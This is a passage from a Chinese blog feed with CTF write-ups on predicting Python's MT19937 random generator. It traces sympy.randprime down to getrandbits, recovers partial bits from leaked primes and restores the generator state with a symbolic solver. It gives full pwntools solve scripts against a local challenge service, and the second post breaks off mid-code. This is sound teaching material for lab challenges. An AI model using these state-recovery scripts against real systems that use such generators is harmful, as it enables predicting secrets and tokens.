title="随机数分析"></a>随机数分析</h2><p>首先我们需要分析一下题目里是如何调用随机数的。</p><p><code>sympy.randprime</code>调用了<code>randint</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">randint</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Return random integer in range [a, b], including both end points.    """</span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>randint</code>实际上调用了<code>randrange</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">randrange</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> start<span class="token punctuation">,</span> stop<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> step<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> _int<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Choose a random item from range(start, stop[, step]).    This fixes the problem with randint() which includes the    endpoint; in Python this is usually not what you want.    """</span>    <span class="token comment"># This code is a bit messy to make it fast for the</span>    <span class="token comment"># common case while still doing adequate error checking.</span>    istart <span class="token operator">=</span> _int<span class="token punctuation">(</span>start<span class="token punctuation">)</span>    <span class="token keyword">if</span> istart <span class="token operator">!=</span> start<span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"non-integer arg 1 for randrange()"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> stop <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> istart <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_randbelow<span class="token punctuation">(</span>istart<span class="token punctuation">)</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"empty range for randrange()"</span><span class="token punctuation">)</span>    <span class="token comment"># stop argument supplied.</span>    istop <span class="token operator">=</span> _int<span class="token punctuation">(</span>stop<span class="token punctuation">)</span>    <span class="token keyword">if</span> istop <span class="token operator">!=</span> stop<span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"non-integer stop for randrange()"</span><span class="token punctuation">)</span>    width <span class="token operator">=</span> istop <span class="token operator">-</span> istart    <span class="token keyword">if</span> step <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> width <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> istart <span class="token operator">+</span> self<span class="token punctuation">.</span>_randbelow<span class="token punctuation">(</span>width<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>randrange</code>在题目的参数设置下，会在上面代码中的第25行返回，调用了<code>_randbelow</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_randbelow <span class="token operator">=</span> _randbelow_with_getrandbits<span class="token keyword">def</span> <span class="token function">_randbelow_with_getrandbits</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"Return a random int in the range [0,n).  Raises ValueError if n==0."</span>    getrandbits <span class="token operator">=</span> self<span class="token punctuation">.</span>getrandbits    k <span class="token operator">=</span> n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># don't use (n-1) here because n can be 1</span>    r <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span>k<span class="token punctuation">)</span>          <span class="token comment"># 0 &lt;= r &lt; 2**k</span>    <span class="token keyword">while</span> r <span class="token operator">>=</span> n<span class="token punctuation">:</span>        r <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span>k<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_randbelow</code>则调用了<code>getrandbits</code>。</p><p>因此，题目中生成大整数的函数「几乎」可以改写如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p <span class="token operator">*</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>为什么是「几乎」呢？因为<code>_randbelow_with_getrandbits</code>内部随机到的<code>r</code>如果大于等于<code>n</code>，会重新随机直到满足条件。在题目的场景下，<code>_randbelow_with_getrandbits</code>函数传入的参数是<code>2 ** bits - 1</code>，这已经是<code>bits</code>位整数里最大的了，也就是说，这里<code>r = getrandbits(k)</code>得到的<code>r</code>，最大也就正好等于<code>n</code>，在这种低概率事件下，才会让随机数调用超过1次。故在大部分时候，每生成一个<code>bits</code>位的素数，只会调用一次<code>getrandbits(bits)</code>，遇到极少数倒霉情况的时候，我们多试一次即可。</p><hr><p>接下来我们需要知道当<code>bits</code>不等于32时，<code>getrandbits(bits)</code>是如何运作的。这里可以直接阅读Python随机数<a href="https://github.com/python/cpython/blob/10ecbadb799ddf3393d1fc80119a3db14724d381/Modules/_randommodule.c">源码</a>或通过观察法得出。这部分的代码我已经实现好了，位于<a href="https://gist.github.com/windshadow233/229ec53e67577bedb8965e652fdc7466#file-mt19937-py-L206">这里</a>。</p><p>简单来说就是先生成的比特会放在最终输出结果的低位，后生成的比特放在输出结果的高位，若最后需要的比特数不足32，则将生成的32bit从高位开始进行一个截断，其余的低位就被丢掉了，这意味着我们拿到的随机数其实丢失了一部分信息。</p><h2 id="从素数还原随机数"><a href="#从素数还原随机数" class="headerlink" title="从素数还原随机数"></a>从素数还原随机数</h2><p>其实我们拿到的并不是生成的随机数，而是「大于此随机数+2的最小素数」，这意味着我们在低位上也丢失了一些信息。我们先写一个函数将可以确定的信息求出来：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">known_prime_to_bits</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># p - 3 >= num >= q - 2</span>    q <span class="token operator">=</span> prevprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    diff <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>    v <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>    unknown_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> v<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>unknown_length<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">*</span> unknown_length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们用<code>?</code>表示不确定的位。</p><p>然后我们根据前面<code>getrandbits(bits)</code>的逻辑，反推出生成它的所有32bit：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">split_bits</span><span class="token punctuation">(</span>number_bin<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> number_bin<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>number_bin<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        number_bin <span class="token operator">=</span> number_bin<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>        result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">"?"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里为了方便起见，直接操作二进制字符串（同时还能兼顾上面有问号的情况，真是太方便了！）</p><p>这样我们就通过一个生成的素数还原出一些已知的随机bit了。那么如何求解呢？</p><h2 id="还原随机数内部状态"><a href="#还原随机数内部状态" class="headerlink" title="还原随机数内部状态"></a>还原随机数内部状态</h2><p>调用现成的轮子即可。</p><a class="tag-Link" target="_blank" href=" https://github.com/icemonster/symbolic_mersenne_cracker">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">SymRandCracker</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">predictor <span class="token operator">=</span> Untwister<span class="token punctuation">(</span><span class="token punctuation">)</span>known_bits <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> known_bits <span class="token operator">&lt;</span> <span class="token number">37000</span><span class="token punctuation">:</span>    p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> bits <span class="token operator">=</span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    vp <span class="token operator">=</span> known_prime_to_bits<span class="token punctuation">(</span>p<span class="token punctuation">,</span> bits<span class="token punctuation">)</span>    vq <span class="token operator">=</span> known_prime_to_bits<span class="token punctuation">(</span>q<span class="token punctuation">,</span> bits<span class="token punctuation">)</span>    split_p <span class="token operator">=</span> split_bits<span class="token punctuation">(</span>vp<span class="token punctuation">)</span>    split_q <span class="token operator">=</span> split_bits<span class="token punctuation">(</span>vq<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> split_p <span class="token operator">+</span> split_q<span class="token punctuation">:</span>        predictor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        known_bits <span class="token operator">+=</span> <span class="token number">32</span> <span class="token operator">-</span> i<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>rng <span class="token operator">=</span> predictor<span class="token punctuation">.</span>get_random<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了一些数，发现<code>known_bits</code>达到<code>37000</code>时，差不多就可以稳定把所有内部状态全还原了。我的电脑求解时间在40-50秒左右，基本能在1分钟内拿到flag。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote<span class="token keyword">import</span> re<span class="token keyword">from</span> sympy <span class="token keyword">import</span> prevprime<span class="token punctuation">,</span> nextprime<span class="token keyword">from</span> SymRandCracker <span class="token keyword">import</span> Untwisterr <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'[E]xit? '</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'H'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'[E]xit? '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'p = (\d+)'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'q = (\d+)'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    bits <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'under (\d+) bits'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> bits<span class="token keyword">def</span> <span class="token function">begin</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'B'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> _ <span class="token operator">=</span> generate_by_rng<span class="token punctuation">(</span>rng<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>sendlines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">randprime</span><span class="token punctuation">(</span>rng<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">>=</span> b<span class="token punctuation">:</span>        <span class="token keyword">return</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> rng<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>    p <span class="token operator">=</span> nextprime<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> p <span class="token operator">>=</span> b<span class="token punctuation">:</span>        p <span class="token operator">=</span> prevprime<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> p <span class="token operator">&lt;</span> a<span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"no primes exist in the specified range"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token keyword">def</span> <span class="token function">generate_by_rng</span><span class="token punctuation">(</span>rng<span class="token punctuation">,</span> bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> randprime<span class="token punctuation">(</span>rng<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> bits<span class="token punctuation">)</span>    q <span class="token operator">=</span> randprime<span class="token punctuation">(</span>rng<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> bits<span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p <span class="token operator">*</span> q<span class="token keyword">def</span> <span class="token function">split_bits</span><span class="token punctuation">(</span>number_bin<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> number_bin<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>number_bin<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        number_bin <span class="token operator">=</span> number_bin<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>        result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">"?"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">known_prime_to_bits</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># p - 3 >= num >= q - 2</span>    q <span class="token operator">=</span> prevprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    diff <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>    v <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>    unknown_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> v<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>unknown_length<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">*</span> unknown_lengthpredictor <span class="token operator">=</span> Untwister<span class="token punctuation">(</span><span class="token punctuation">)</span>known_bits <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> known_bits <span class="token operator">&lt;</span> <span class="token number">37000</span><span class="token punctuation">:</span>    p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> bits <span class="token operator">=</span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    vp <span class="token operator">=</span> known_prime_to_bits<span class="token punctuation">(</span>p<span class="token punctuation">,</span> bits<span class="token punctuation">)</span>    vq <span class="token operator">=</span> known_prime_to_bits<span class="token punctuation">(</span>q<span class="token punctuation">,</span> bits<span class="token punctuation">)</span>    split_p <span class="token operator">=</span> split_bits<span class="token punctuation">(</span>vp<span class="token punctuation">)</span>    split_q <span class="token operator">=</span> split_bits<span class="token punctuation">(</span>vq<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> split_p <span class="token operator">+</span> split_q<span class="token punctuation">:</span>        predictor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        known_bits <span class="token operator">+=</span> <span class="token number">32</span> <span class="token operator">-</span> i<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>rng <span class="token operator">=</span> predictor<span class="token punctuation">.</span>get_random<span class="token punctuation">(</span><span class="token punctuation">)</span>begin<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文是一道MT19937随机数预测的实战题，这道题是我2019年第一次参加Hackergame时遇到的，题目链接如下：&lt;/p&gt;
&lt;a class=&quot;tag-Link&quot; target=&quot;_blank&quot; href=&quot;</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://blog.fyz666.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="PRNG" scheme="https://blog.fyz666.xyz/tags/prng/"/>
    
    <category term="MT19937" scheme="https://blog.fyz666.xyz/tags/mt19937/"/>
    
  </entry>
  
  <entry>
    <title>Python随机数的背后：MT19937算法之——小试牛刀</title>
    <link href="https://blog.fyz666.xyz/blog/12343/"/>
    <id>https://blog.fyz666.xyz/blog/12343/</id>
    <published>2024-11-20T21:27:45.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>本文为几道MT19937预测题的题解。这些题都非常基础+典型，十分适合入门。</p><p>本文用到的<code>mt19937</code>来自<a href="https://gist.github.com/windshadow233/229ec53e67577bedb8965e652fdc7466">此gist</a>。</p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> random<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非常简单的预测，给了连续624个32bit随机数，只需把它们依次输入预测器，就能恢复出完整的内部状态。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tqdm<span class="token keyword">from</span> mt19937 <span class="token keyword">import</span> MT19937Predictor<span class="token keyword">from</span> pwn <span class="token keyword">import</span> remoter <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>predictor <span class="token operator">=</span> MT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    predictor<span class="token punctuation">.</span>setrand_int32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>predictor<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> randomnumber <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token 